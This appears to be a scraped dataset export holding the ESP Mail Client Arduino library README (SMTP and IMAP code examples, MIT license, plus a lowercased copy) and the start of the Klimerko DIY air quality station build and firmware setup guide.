\"iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAAoUlEQVR42u3RAQ0AMAgAoJviyWxtAtNYwzmoQGT/eqwRQoQgRAhChCBECEKECBGCECEIEYIQIQgRghCECEGIEIQIQYgQhCBECEKEIEQIQoQgBCFCECIEIUIQIgQhCBGCECEIEYIQIQhBiBCECEGIEIQIQQhChCBECEKEIEQIQhAiBCFCECIEIUIQghAhCBGCECEIEYIQIUKEIEQIQoQg5LoBBaDPbQYiMoMAAAAASUVORK5CYII=\";\n// Define the attachment data\nSMTP_Attachment att;\n// Set the attatchment info\natt.descr.filename = \"green.png\";\natt.descr.mime = \"image/png\";\natt.blob.data = (uint8_t *)greenImg;\natt.blob.size = strlen(greenImg);\n// Set the transfer encoding to base64\natt.descr.transfer_encoding = Content_Transfer_Encoding::enc_base64;\n// We set the content encoding to match the above greenImage data\natt.descr.content_encoding = Content_Transfer_Encoding::enc_base64;\n// Add attachment to the message\nmessage.addAttachment(att);\n// Connect to server with the session config\nsmtp.connect(&session);\n// Start sending Email and close the session\nif (!MailClient.sendMail(&smtp, &message))\nSerial.println(\"Error sending Email, \" + smtp.errorReason());\nRead the Email\n// Include ESP Mail Client library (this library)\n#include <ESP_Mail_Client.h>\n// Define the IMAP Session object which used for IMAP transsport\nIMAP_Config config;\n// Define the session config data which used to store the TCP session configuration\nESP_Mail_Session session;\n// Set the session config\nsession.server.host_name = \"outlook.office365.com\"; //for outlook.com\nsession.server.port = 993;\nsession.login.email = \"your Email address\";\nsession.login.password = \"your Email password\";\n// Define the config class variable for searching or fetching operation and store the messsagess data\nIMAP_Config config;\n// Define the message UID which required to fetch or read the message\nconfig.fetch.uid = \"100\";\n// Define the empty search criteria to disable the messsage search\nconfig.search.criteria = \"\";\n// Set to enable the message content which will be stored in the IMAP_Config data\nconfig.enable.html = true;\nconfig.enable.text = true;\n// Connect to the server with the defined session and options\nimap.connect(&session, &config);\n// Open or select the mailbox folder to read the message\nimap.selectFolder(\"INBOX\");\n// Read the Email and close the session\nMailClient.readMail(&imap);\n// Get the message(s) list\nIMAP_MSG_List msgList = imap.data();\nfor (size_t i = 0; i < msgList.msgItems.size(); i++)\n{\n// Iterate to get each message data through the message item data\nIMAP_MSG_Item msg = msgList.msgItems[i];\nSerial.println(\"################################\");\nESP_MAIL_PRINTF(\"Messsage Number: %s\\n\", msg.msgNo);\nESP_MAIL_PRINTF(\"Messsage UID: %s\\n\", msg.UID);\nESP_MAIL_PRINTF(\"Messsage ID: %s\\n\", msg.ID);\nESP_MAIL_PRINTF(\"Accept Language: %s\\n\", msg.acceptLang);\nESP_MAIL_PRINTF(\"Content Language: %s\\n\", msg.contentLang);\nESP_MAIL_PRINTF(\"From: %s\\n\", msg.from);\nESP_MAIL_PRINTF(\"From Charset: %s\\n\", msg.fromCharset);\nESP_MAIL_PRINTF(\"To: %s\\n\", msg.to);\nESP_MAIL_PRINTF(\"To Charset: %s\\n\", msg.toCharset);\nESP_MAIL_PRINTF(\"CC: %s\\n\", msg.cc);\nESP_MAIL_PRINTF(\"CC Charset: %s\\n\", msg.ccCharset);\nESP_MAIL_PRINTF(\"Date: %s\\n\", msg.date);\nESP_MAIL_PRINTF(\"Subject: %s\\n\", msg.subject);\nESP_MAIL_PRINTF(\"Subject Charset: %s\\n\", msg.subjectCharset);\n// If the message body is available\nif (!imap.headerOnly())\n{\nESP_MAIL_PRINTF(\"Text Message: %s\\n\", msg.text.content);\nESP_MAIL_PRINTF(\"Text Message Charset: %s\\n\", msg.text.charSet);\nESP_MAIL_PRINTF(\"Text Message Transfer Encoding: %s\\n\", msg.text.transfer_encoding);\nESP_MAIL_PRINTF(\"HTML Message: %s\\n\", msg.html.content);\nESP_MAIL_PRINTF(\"HTML Message Charset: %s\\n\", msg.html.charSet);\nESP_MAIL_PRINTF(\"HTML Message Transfer Encoding: %s\\n\\n\", msg.html.transfer_encoding);\n}\n}\nLicense\nThe MIT License (MIT)\nCopyright (c) 2021 K. Suwatchai (Mobizt)\nPermission is hereby granted, free of charge, to any person returning a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\nThe above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.", "link": "https://github.com/mobizt/ESP-Mail-Client", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "mail client arduino library v1.6.1\nthe first, complete and secure arduino email client library for espressif's esp32 and esp8266, atmel's samd21 devices with u-blox nina-w102 wifi/bluetooth module to send and read email through the smtp and imap servers.\nthis library allows sending and reading email with various attachments supported and provides more reliable and flexibilities of usages.\nthe library was tested and work well with esp32s, esp8266s, samd21s based modules.\nthis library was developed to replace the deprecated esp32 mail client library with more options and features, better reliability and also conforms to the rfc standards.\nthis library has built-in wifi client and aim to be complete email client that can send and read email with no restrictions and no indirect email proxy (email sending server) services needed.\nother serial mobile network modem (gsm/3g/4g) and spi/i2c ethernet board which gsm or ethernet plain/ssl tcp client libraries are available, are not compattible to integrate to use with this library because network upgradable was not supported in those libraries.\nthis library supports sending and receiving email via ethernet in esp32 and esp8266 devices using ethernet module through secure (ssl/tls) and non-secure ports.\ncopyright (c) 2021 k. suwatchai (mobizt).\nfeatures\nsupport espressif's esp32 and esp8266, atmel's samd21 devices with u-blox nina-w102 wifi/bluetooth module.\nsupport tcp session reusage.\nsupport plain, login and xoauth2 authentication mechanisms.\nsupport secured (with ssl and tls or upgrade via starttls) and non-secure ports.\nsupport mailbox selection for email reading and searching (imap).\nsupport mailbox changes notification (imap).\nsupport the content encodings e.g. quoted-printable and base64.\nsupport the content decodings e.g. base64, utf-8, utf-7, quoted-printable, iso-8859-1 (latin1) and iso-8859-11 (thai).\nsupport embedded contents e.g. inline images, attachments, parallel media attachments and rfc822 message.\nsupport full debuging.\nsupport flash memory (esp32 and esp8266), sd and sd_mmc (esp32) for file storages which can be changed in esp_mail_fs.h.\nsupport ethernet (esp32 using lan8720, tlk110 and ip101 ethernet modules, and esp8266 (arduino core sdk v3.x.x and later) using enc28j60, w5100 and w5500 ethernet modules).\ncustomizable configurations (see the examples for the usages)\nsupported devices\nthis following devices are supported.\nesp8266 mcus based boards\nesp32 mcus based boards\narduino mkr wifi 1010\narduino nano 33 iot\narduino mkr vidor 4000\nlan8720 ethernet phy\ntlk110 ethernet phy\nip101 ethernet phy\nenc28j60 spi ethernet module\nw5100 spi ethernet module\nw5500 spi ethernet module\nnote: arduino uno wifi rev.2 (avr platform) is not supported.\ntested devices\nthis following devices were tested.\nsparkfun esp32 thing\nnodemcu-32\nwemos lolin32\nttgo t8 v1.8\nm5stack esp32\nnodemcu esp8266\nwemos d1 mini (esp8266)\narduino mkr wifi 1010\nlan8720 ethernet phy\nenc28j60 spi ethernet module\nprerequisites\nesp32 and esp8266\nfor espressif's esp32 and esp8266 based boards, this library requires arduino's esp32 or esp8266 core sdk to be installed.\nthe latest core sdk is recommended. for esp8266, the core sdk version 3.x.x or later is recommended.\nthe esp8266 core sdk version 2.5.x and earlier are not supported.\nsamd21\nfor atmel's samd21 based boards, custom built wifinina firmware is needed to be installed instead of official arduino wifinina firmware.\ncomparison between custom built and official wifinina firmwares.\noptions custom built firmware arduino official firmware\nplain connection via port 25, 143 yes yes\nsecure (ssl) connection via port 465, 993 yes yes\nupgradable (starttls) via port 25, 587, 143 yes no\nrequire email server root certificate installation optional, not required by default *yes\nrequire wifinina library installation no (already built-in) yes\n*require root certificate of email server which is available in arduino ide's wifi101 /wifinina firmware updater -----> tool !!! .\ninstall custom built wifinina firmware\nto install custom built wifinina firmware, please follow the following instructions.\ninstall flash tool, esptool.py from here. to instal esptool python script, you will need either python 2.7 or python 3.4 or newer installed on your system.\ndownload nina-fw.bin in firmwares/samd21 and serialninapassthrough.ino.\ncompile and upload serialninapassthrough.ino to the device.\nopen the terminal program (linux and macos) or command prompt (windows), and type this command.\nesptool.py --port <com-port> --baud 115200 --before default_reset --after hard_reset write_flash 0x0 <path/to/file>/nina-fw.bin\nfrom command above, replace <com-port> with your comport e.g. com5 (windows) or /dev/ttyusb0 (linux and macos) and also replace <path/to/file> with your path to the nina-fw.bin that has been extracted.\nthe flash (upload) result shows in the command prompt window will look similar to below image.\nif the custom built wifinina firmware was installed, the debug message will show the library version with wifinina firmware version which followed by built number (+21120).\n> c: esp mail client v1.6.1, fw v1.4.8+21120\nlibrary instalation\nclick on clone or download dropdown at the top of repository, select download zip and save file on your computer.\nfrom arduino ide, goto menu sketch -> include library -> add .zip library... and choose esp-mail-client-master.zip that previously downloaded.\ngo to menu files -> examples -> esp-mail-client-master and choose one from examples\nide configuaration for esp8266 mmu - adjust the ratio of icache to iram\narduino ide\nwhen you update the esp8266 arduino core sdk to v3.0.0, the memory can be configurable from arduino ide board settings.\nby default mmu option 1 was selected, the free heap can be low and may not suitable for the ssl client usage in this library.\nto increase the heap, choose the mmu option 3, 16kb cache + 48kb iram and 2nd heap (shared).\nto use external heap from 1 mbit sram 23lc1024, choose the mmu option 5, 128k external 23lc1024.\nto use external heap from psram, choose the mmu option 6, 1m external 64 mbit psram.\nthe connection between sram/psram and esp8266\n23lc1024/esp-psram64 esp8266\ncs (pin 1) gpio15\nsck (pin 6) gpio14\nmosi (pin 5) gpio13\nmiso (pin 2) gpio12\n/hold (pin 7 on 23lc1024 only) 3v3\nvcc (pin 8) 3v3\nvcc (pin 4) gnd\nmore about mmu settings. https://arduino-esp8266.readthedocs.io/en/latest/mmu.html\nplatformio ide\nby default the balanced ratio (32kb cache + 32kb iram) configuration is used.\nto increase the heap, pio_framework_arduino_mmu_cache16_iram48_secheap_shared build flag should be assigned in platformio.ini.\n[env:d1_mini]\nplatform = espressif8266\nbuild_flags = -d pio_framework_arduino_mmu_cache16_iram48_secheap_shared\nboard = d1_mini\nframework = arduino\nmonitor_speed = 115200\nand to use external heap from 1 mbit sram 23lc1024 and 64 mbit psram, pio_framework_arduino_mmu_external_128k and pio_framework_arduino_mmu_external_1024k build flags should be assigned respectively.\nthe supportedd mmu build flags in platformio.\npio_framework_arduino_mmu_cache16_iram48\n16kb cache + 48kb iram (iram)\npio_framework_arduino_mmu_cache16_iram48_secheap_shared\n16kb cache + 48kb iram and 2nd heap (shared)\npio_framework_arduino_mmu_cache16_iram32_secheap_notshared\n16kb cache + 32kb iram + 16kb 2nd heap (not shared)\npio_framework_arduino_mmu_external_128k\n128k external 23lc1024\npio_framework_arduino_mmu_external_1024k\n1m external 64 mbit psram\npio_framework_arduino_mmu_custom\ndisables default configuration and expects user-specified flags\nto use psram/sram for internal memory allocation which you can config to use it via esp_mail_fs.h with this macro.\n#define esp_mail_use_psram\ntest code for mmu\n#include <arduino.h>\n#include <umm_malloc/umm_heap_select.h>\nvoid setup()\n{\nserial.begin(115200);\nheapselectiram ephemeral;\nserial.printf(\"iram free: %6d bytes\\r\\n\", esp.getfreeheap());\n{\nheapselectdram ephemeral;\nserial.printf(\"dram free: %6d bytes\\r\\n\", esp.getfreeheap());\n}\nesp.setexternalheap();\nserial.printf(\"external free: %d\\n\", esp.getfreeheap());\nesp.resetheap();\n}\nvoid loop() {\n// put your main code here, to run repeatedly:\n}\nuse psram on esp32\nto enable psram in esp32 module with psram chip, in arduino ide\nin platformio in vscode ide, add the following build_flags in your project's platformio.ini file\nbuild_flags = -dboard_has_psram -mfix-esp32-psram-cache-issue\nthe examples/smtp/send_attachment_psram/send_attachment_psram.ino showed how to send the attachment stored in psram.\nsince v1.5.4, this library supports psram for internal memory allocation which you can config to use it via esp_mail_fs.h with this macro.\n#define esp_mail_use_psram\nexclude unused classes to save memory\nnow you can compile the library only for seclected classes.\nin esp_mail_fs.h, the imap and smtp class can be enabled with the macros.\n#define enable_imap\n#define enable_smtp\nin esp8266 and esp32, when no attachments require for uploading and downloading, the storage file systems libraries e.g. sd or sd_mmc (esp32), spiffs and littlefs will no longer use and can be excluded when compiling the code to reduce program flash size, by comment the following macros to exclude them.\n#define esp_mail_default_sd_fs sd\n#define esp_mail_default_flash_fs spiffs\nusage\nsee full examples for complete usages.\nsee function description for all available functions.\nthe following examples showed the minimum usage which many options are not configured.\nthe examples in the examples folder provide the full options usages.\nnotes\nthe string in the function's parameters or properties of structured data is the pointer to constant char or char array.\nyou need to assign the string literal or char array or pointer to constant char to it.\nex.\nmessage.sender.name = \"my mail\";\nmessage.sender.email = \"sender or your email address\";\nor using string class\nstring name = \"john\";\nstring email = \"john@mail.com\";\nmessage.sender.name = name.c_str();\nmessage.sender.email = email.c_str();\nsend the email\n// include esp mail client library (this library)\n#include <esp_mail_client.h>\n// define the smtp session object which used for smtp transsport\nsmtpsession smtp;\n// define the session config data which used to store the tcp session configuration\nesp_mail_session session;\n// set the session config\nsession.server.host_name = \"smtp.office365.com\"; //for outlook.com\nsession.server.port = 587;\nsession.login.email = \"your email address\"; //set to empty for no smtp authentication\nsession.login.password = \"your email password\"; //set to empty for no smtp authentication\nsession.login.user_domain = \"client domain or ip e.g. mydomain.com\";\n// set the ntp config time\nsession.time.ntp_server = \"pool.ntp.org,time.nist.gov\";\nsession.time.gmt_offset = 3;\nsession.time.day_light_offset = 0;\n// define the smtp_message class variable to handle to message being transport\nsmtp_message message;\n// set the message headers\nmessage.sender.name = \"my mail\";\nmessage.sender.email = \"sender or your email address\";\nmessage.subject = \"test sending email\";\nmessage.addrecipient(\"name1\", \"email1\");\nmessage.addrecipient(\"name2\", \"email2\");\nmessage.addcc(\"email3\");\nmessage.addbcc(\"email4\");\n// set the message content\nmessage.text.content = \"this is simple plain text message\";\n//base64 data of image\nconst char *greenimg = \"ivborw0kggoaaaansuheugaaagqaaabkcayaaabw4pvuaaaaouleqvr42u3raq0amagaojviywxtatnywzmoqgt/eqwrqoqgrahchcbecekecbgceceieyiqiqgrghcecegieiqiqygqhcbecekeieqiqoqgbcfcecieiuiqigqhcbgceceieyiqiqhbibcecegieiqiqqhchcbecekeieqiqhaibcfcecieiuiqghahcbgceceieyiqiukeieqiqoqg5lobbadpbqyimomaaaaasuvork5cyii=\";\n// define the attachment data\nsmtp_attachment att;\n// set the attatchment info\natt.descr.filename = \"green.png\";\natt.descr.mime = \"image/png\";\natt.blob.data = (uint8_t *)greenimg;\natt.blob.size = strlen(greenimg);\n// set the transfer encoding to base64\natt.descr.transfer_encoding = content_transfer_encoding::enc_base64;\n// we set the content encoding to match the above greenimage data\natt.descr.content_encoding = content_transfer_encoding::enc_base64;\n// add attachment to the message\nmessage.addattachment(att);\n// connect to server with the session config\nsmtp.connect(&session);\n// start sending email and close the session\nif (!mailclient.sendmail(&smtp, &message))\nserial.println(\"error sending email, \" + smtp.errorreason());\nread the email\n// include esp mail client library (this library)\n#include <esp_mail_client.h>\n// define the imap session object which used for imap transsport\nimap_config config;\n// define the session config data which used to store the tcp session configuration\nesp_mail_session session;\n// set the session config\nsession.server.host_name = \"outlook.office365.com\"; //for outlook.com\nsession.server.port = 993;\nsession.login.email = \"your email address\";\nsession.login.password = \"your email password\";\n// define the config class variable for searching or fetching operation and store the messsagess data\nimap_config config;\n// define the message uid which required to fetch or read the message\nconfig.fetch.uid = \"100\";\n// define the empty search criteria to disable the messsage search\nconfig.search.criteria = \"\";\n// set to enable the message content which will be stored in the imap_config data\nconfig.enable.html = true;\nconfig.enable.text = true;\n// connect to the server with the defined session and options\nimap.connect(&session, &config);\n// open or select the mailbox folder to read the message\nimap.selectfolder(\"inbox\");\n// read the email and close the session\nmailclient.readmail(&imap);\n// get the message(s) list\nimap_msg_list msglist = imap.data();\nfor (size_t i = 0; i < msglist.msgitems.size(); i++)\n{\n// iterate to get each message data through the message item data\nimap_msg_item msg = msglist.msgitems[i];\nserial.println(\"################################\");\nesp_mail_printf(\"messsage number: %s\\n\", msg.msgno);\nesp_mail_printf(\"messsage uid: %s\\n\", msg.uid);\nesp_mail_printf(\"messsage id: %s\\n\", msg.id);\nesp_mail_printf(\"accept language: %s\\n\", msg.acceptlang);\nesp_mail_printf(\"content language: %s\\n\", msg.contentlang);\nesp_mail_printf(\"from: %s\\n\", msg.from);\nesp_mail_printf(\"from charset: %s\\n\", msg.fromcharset);\nesp_mail_printf(\"to: %s\\n\", msg.to);\nesp_mail_printf(\"to charset: %s\\n\", msg.tocharset);\nesp_mail_printf(\"cc: %s\\n\", msg.cc);\nesp_mail_printf(\"cc charset: %s\\n\", msg.cccharset);\nesp_mail_printf(\"date: %s\\n\", msg.date);\nesp_mail_printf(\"subject: %s\\n\", msg.subject);\nesp_mail_printf(\"subject charset: %s\\n\", msg.subjectcharset);\n// if the message body is available\nif (!imap.headeronly())\n{\nesp_mail_printf(\"text message: %s\\n\", msg.text.content);\nesp_mail_printf(\"text message charset: %s\\n\", msg.text.charset);\nesp_mail_printf(\"text message transfer encoding: %s\\n\", msg.text.transfer_encoding);\nesp_mail_printf(\"html message: %s\\n\", msg.html.content);\nesp_mail_printf(\"html message charset: %s\\n\", msg.html.charset);\nesp_mail_printf(\"html message transfer encoding: %s\\n\\n\", msg.html.transfer_encoding);\n}\n}\nlicense\nthe mit license (mit)\ncopyright (c) 2021 k. suwatchai (mobizt)\npermission is hereby granted, free of charge, to any person returning a copy of this software and associated documentation files (the \"software\"), to deal in the software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, and to permit persons to whom the software is furnished to do so, subject to the following conditions:\nthe above copyright notice and this permission notice shall be included in all copies or substantial portions of the software.\nthe software is provided \"as is\", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose and noninfringement. in no event shall the authors or copyright holders be liable for any claim, damages or other liability, whether in an action of contract, tort or otherwise, arising from, out of or in connection with the software or the use or other dealings in the software.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000556, "year": null}, {"Unnamed: 0": 2632, "autor": 592, "date": null, "content": "\u201cKlimerko\u201d Air Quality Monitoring Station\n\"Klimerko\" is the continuation of the Winning Project from Descon 4.0 2018.\nSee live data from all Klimerko devices: Klimerko.org\nThis is an affordable DIY air quality station that measures Particulate Matter concentration as well as Temperature, Humidity and Pressure.\nIt publishes data to your AllThingsTalk Maker Cloud (free) where you're able to visualize data, see it historically and control the device.\nContinue reading to find out how to build your own, or watch the video below that covers the process.\nNOTICE: The video was created before the release of Klimerko Firmware v2.0.0, which introduced WiFi Configuration Mode, so the process of connecting the device to WiFi and AllThingsTalk shown in the video is outdated.\nHaving issues? Go to the Troubleshooting section.\nTo update your Klimerko, go to Updating Firmware.\nTable of Contents\nThis guide is in chronological order, so try not to skip through parts if you're not sure about it.\nHardware Build\nHardware Required\nTools Required\n3D Case Preparation\nPMS7003 Sensor Preparation\nBME280 Sensor Preparation\nNodeMCU Preparation\nCloud Platform (1/2)\nSoftware\nInstalling ESP8266 Support\nUploading Firmware\nConfiguring Klimerko Credentials\nCloud Platform (2/2)\nConfigure Device\nShare Data\nVisualize Data\nUpdating Firmware\nUpdating Wirelessly (OTA)\nUpdating using Arduino IDE\nToubleshooting\nUse Serial Monitor\nCompilation issues\nKlimerko can't see WiFi network\nCan't connect to Klimerko to configure it\nKlimerko isn't connecting to WiFi or AllThingsTalk\nAssets not being updated\nKlimerko won't turn on\nFactory Reset your Klimerko\nHardware Build\nThis diagram shows an overview of how Klimerko works\nHardware Required\nYou'll need these components to follow this guide:\nPreviously, some of the components below were clickable so you could buy them right away, but shipping to Balkans on some websites became 10x more expensive than the components themselves, therefore the list now only contains the names, description and a photo of the items you need to buy.\nYou can search for these components on eBay, Banggood, AliExpress or your local electronics store/website.\nNodeMCU (Amica, with CP2102 chip)\nTry to avoid the cheapest ones as they're using a different pinout and a weaker CHG340 chip.\nIt should look exactly like this:\nPlantower PMS7003 Air Quality Sensor\nGet the one with a connector and a bridge board.\nShould look exactly like this:\nBosch BME280 Temperature/Humidity/Pressure Sensor\nMake sure to get the BME280 and not the cheaper BMP280.\nThere are variants with 6 pins, and if you find them to be cheaper than the ones with 4 pins (as shown below), you can buy that as well - you just won't use additional 2 pins.\nIt should look exactly like this:\nUSB Power adapter (5V, minimum 250mA/0.25A)\nMicroUSB Cable\n4x Wires (each at least 13cm long)\nOptional: 3D printed case for the device (STL Files), which comprises of:\nComponents base\nWeather-resistant cover\nFlat stand\nWall-mount holder\nNon-3D-Printed: 5x Screws (for plastic, 3x5mm) (7x screws if you\u2019re going to wall-mount the device)\nTools Required\nYou\u2019re going to need the following tools at minimum to complete the project:\nSoldering Iron\nSolder\nScissors or a Wire Stripper\nScrewdriver (required only if using 3D printed case)\nHardware Assembly\nOnce you\u2019ve got all the components and tools ready, it\u2019s time to begin the assembly process.\nWhen soldering, make sure that there's no solder between any two pins (connection holes in the board) on any of the components before plugging the device into a power source.\nPay attention to VIN and GND pins on the NodeMCU, because shorting (connecting) those two pins together will fry NodeMCU and possibly the power source it's connected to.\n3D Case Preparation\nYou can print your own Klimerko Case using a 3D Printer using the 3D Print Files. If you don't have a 3D Printer, your local hacker/makerspace most likely has one!\nIn case you're not following this guide at a workshop: You're still able to build this device if you don't have the 3D case. You'll just need to tinker and figure out how to place the device in a secure location away from rain/sun (but in an open space so it can detect pollution properly)\nDepending on your use case, you can use either the flat stand or the wall-mounted holder. If you wish to wall-mount the device, use 2 screws to mount the holder to a wall. You\u2019ll be able to easily attach and detach the device from the wall.\nFor now, disassemble the case and put away all the parts except for the components base, where you\u2019ll be placing all the components.\nPMS7003 Sensor Preparation\nFirst, make sure not to remove the blue plastic cover from the PMS7003 sensor as it helps it fit into the 3D case better.\nPlace the PMS7003 sensor into the components base of the 3D case with the connection port of PMS7003 facing outwards in upper right side.\nPlug in the connector cable into the bridge board.\nBecause we don\u2019t need excess cabling, removal of the unnecessary wires from the connector cable is suggested. In order to know which wires to pull, make sure the connector cable is plugged into the bridge board so that you can see the markings on the board that correspond to the wires. To remove the wires, pull them with medium force until they\u2019re detached from the connector. These are the wires to pull (marked red):\nNC (first one)\nNC (second one)\nRST\nSET The only wires left attached should be TX, RX, GND and VCC.\nMeasure ~13cm of all 4 remaining wires from the connector cable and cut the rest, so you\u2019re left with the connector at one end and cut wires on the other.\nUsing scissors or a wire stripper, remove the insulation ~2mm from the end of each wire, so you\u2019re left with clear copper at the ends.\nPlug the bridge board (with the connector cable in) into the PMS7003 Sensor.\nRoute the wires through the circular hole in the components base of the 3D case so it reaches the other side of the base.\nBME280 Sensor Preparation\nTake the 4 wires you have prepared (not to be confused with the PMS7003 wires) and strip (remove insulation) ~2mm from each end of each wire so that you have 4 wires with all ends stripped.\nSolder those 4 wires to pins SDA, SCL, GND, VCC/VIN on the BME280.\nIf you have a 6-pin version of BME280, the CSB and SDO pins simply aren't used.\nMake sure the PMS7003 Sensor is seated properly (because BME280 goes above it), and only then proceed to the next step.\nMount the BME280 sensor in place by screwing it to the hole in the upper right side of the 3D case (above the PMS7003).\nRoute the wires through the circular hole in the components base of the 3D case so it reaches the other side of the base.\nYou have now completed the setup of the sensor side of the components base. Next up, the NodeMCU side.\nNodeMCU Preparation\nYou should now have 8 wires coming through the circular hole leading to the NodeMCU side of the 3D case.\nSolder the wires to the NodeMCU board:\nPlease double check to make sure you\u2019re soldering the correct wires (coming from the sensors) to the NodeMCU board.\nSensor Sensor Wire NodeMCU Pin\nPMS7003 VCC VIN\nPMS7003 GND GND (Any GND pin works)\nPMS7003 RX D6\nPMS7003 TX D5\nBME280 VCC/VIN 3v3 (Any 3v3 pin works)\nBME280 GND GND (Any GND pin works)\nBME280 SCL D1\nBME280 SDA D2\nYou have now finished all steps that require soldering.\nNow use 4 screws to place the NodeMCU in its spot in the components base of the 3D case.\nDouble check all the connections and if everything is as it should be.\nPut the weather-resistant cover of the 3D case over the components base (it's better to do this once everything is done and device is connected, though)\nCongratulations, you\u2019ve assembled the device! Now onto the software side.\nCloud Platform (1/2)\nHead over to AllThingsTalk Maker and create a free account\nSign in\nClick \u201cPlayground\u201d\nIn \"Devices\", click \"+ New Device\"\nChoose \u201cDescon Klimerko\u201d\nClick \u201cSettings\u201d in the upper right corner\nClick \u201cAuthentication\u201d\nWrite down your Device ID and Device Token\nSoftware\nFor all of the steps below, you'll need Arduino IDE (Integrated Development Environment).\nThis is a tool that's used to send the \"firmware\" or \"program\" to your device.\nIf you already have Arduino IDE, make sure it's at least version 1.8.15\nDownload and install Arduino IDE (choose \u201cWindows installer, for Windows XP and up\u201d if you\u2019re on Windows, otherwise it'll download the Windows Store version, which might give you issues).\nIf you're running Apple's MacOS, also download and install the CP2102 Driver in order to enable your Mac to recognize Klimerko for further steps.\nInstalling ESP8266 Support\nESP8266 is the \"brains\" or \"processor\" of the NodeMCU, but Arduino IDE doesn't support it out-of-the-box. That's an easy one:\nOpen Arduino IDE\nGo to File > Preferences\nIn the Additional Boards Manager URLs, enter http://arduino.esp8266.com/stable/package_esp8266com_index.json and click OK\nGo to Tools > Board > Boards Manager\nSearch for \u201cesp8266\u201d by ESP8266 Community\nClick Install\nOnce done, close the window.\nUploading Firmware\nYour NodeMCU's \"brain\" is empty at the moment. Let's teach it what it needs to do by uploading the program to it:\nPlug in the USB cable into your Klimerko device and your computer\nDownload https://github.com/DesconBelgrade/Klimerko/archive/master.zip\nUnzip the file, open it and go to \u201cKlimerko_Firmware\u201d folder\nOpen \u201cKlimerko_Firmware.ino\u201d with Arudino IDE\nNow go to Tools > Board and choose \u201cNodeMCU 1.0 (ESP-12E Module)\u201d\nGo to Tools > Upload Speed and choose 115200\nGo to Tools > Port and you should see COM and a number next to it. Choose it.\nIf you're running MacOS, choose /dev/cu.SLAB_USBtoUART\nGo to \u201cSketch\u201d > \u201cUpload\u201d and wait for the firmware to be uploaded to your Klimerko device\nConfiguring Klimerko Credentials\nSince Klimerko Firmware version 2.0.0, the process of entering WiFi & Platform credentials has been immensely simplified by introducing WiFi Configuration Mode, a feature where Klimerko itself becomes a WiFi Access Point to which you can connect to using your computer or smartphone and then configure the credentials using a simple web interface that opens up automatically once you're connected to your Klimerko.\nYou need tell your Klimerko which credentials to use to connect to the platform and to which WiFi to connect to:\nMake sure your Klimerko is connected to power.\nLift your Klimerko's cover to expose the NodeMCU board.\nPress and hold the FLASH button for 2 seconds and then let go.\nThe blue LED on the NodeMCU should turn on and stay on. This indicates the WiFi Configuration Mode is currently active and you can connect to your Klimerko.\nUsing your computer or a smartphone, search for and connect to WiFi Network \"KLIMERKO-XXX\" (the X's are numbers) using password \"ConfigMode\".\nYour device should automatically open Klimerko's WiFi Configuration Portal. If it doesn't, navigate to 192.168.4.1 in your browser.\nClick the first \"Configure WiFi\" button.\nA list of available WiFi Networks will be shown, along with a field to enter your AllThingsTalk Device ID and Device Token.\nNodeMCU only supports 2.4GHz, so make sure the network you're trying to connect your Klimerko to is not a 5GHz network.\nSelect your WiFi network from the list (or manually enter WiFi network name if you're not in range of the network you plan to use your Klimerko on), enter your WiFi Password and copy/paste the AllThingsTalk Device ID and Device Token that you noted in previous step (Cloud Platform Credentials)\nIf you are updating your credentials, it is possible to only update some of them by leaving other fields empty. The empty fields will not overwrite the values stored in memory when saving.\nClick \"Save\".\nKlimerko has now automatically shut down the WiFi Configuration Mode (the blue LED stops shining constantly) and your computer/smartphone will disconnect from \"KLIMERKO-XXX\" network. The WiFi Configuration Portal will automatically close on your computer/smartphone only if it was automatically opened. Otherwise, you'll need to close the browser tab.\nYour Klimerko will now attempt to connect to WiFi and AllThingsTalk, indicated by slow blinking of the LED light.\nObserve the LED on the NodeMCU. If it blinks quickly a few times and then turns off completely, your Klimerko is connected to both WiFi and AllThingsTalk. Otherwise, repeat the process (the credentials could be incorrect) or check the Troubleshooting section.\nThe blue LED light on NodeMCU blinks slowly (in 1 second intervals) when Klimerko is trying to connect to WiFi or AllThingsTalk (or if the connection can't be established).\nIf it blinks rapidly a few times and then turns off, the connection to WiFi and AllThingsTalk has been made succesfully.\nIf it's turned on constantly, it means the WiFi Configuration Mode is currently active and you can connect to your Klimerko using your smartphone.\nIf you wish to turn off WiFi Configuration Mode without configuring your Klimerko, press the \"FLASH\" button on your NodeMCU quickly, once. The constant blue LED should turn off.\nCloud Platform (2/2)\nAll of the data from your Klimerko is available on your AllThingsTalk Maker.\nOther than raw actual and historical air quality values, you\u2019re able to see your air quality in a textual form at a glance, see the WiFi Signal Strength of your Klimerko and control how often your Klimerko publishes data.\nYou\u2019ll also get notifications if your Klimerko goes offline for any reason.\nConfigure Device\nOpen AllThingsTalk Maker, go to \u201cDevices\u201d and select your new \u201cDescon Klimerko\u201d device.\nYou\u2019ll see all assets of your device (stuff that it can report and things you can control).\nMake sure to keep the data (that you\u2019re about to set below) updated if you move your device\nClick on the \u201cLocation\u201d asset and select the location of your Klimerko on the map\nClick on the \u201cHeight\u201d asset and set the height of your device (in meters) by adding a value right next to \"value\": and clicking the \u2714\ufe0f button when done (below is an example of 10 meters height):\n{\n\"at\": \"2019-10-18T11:28:04.554Z\",\n\"value\": 10\n}\nThis needs to be done since air pollution readings are different on different 